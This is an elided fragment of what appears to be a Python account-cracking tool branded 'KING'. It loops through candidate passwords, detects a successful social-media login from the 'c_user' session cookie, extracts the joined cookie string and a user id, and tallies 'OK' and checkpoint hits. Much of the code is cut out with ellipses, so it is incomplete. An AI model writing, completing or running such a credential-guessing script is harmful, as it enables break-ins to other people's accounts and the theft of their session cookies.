...
logo = """
         ...
         \033[1;37m██║  ██╗██║██║ ╚████║╚██████╔╝
         \033[1;37m ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
         \033[1;32m KING\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mKING\033[1;37m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[KING-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mKING\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
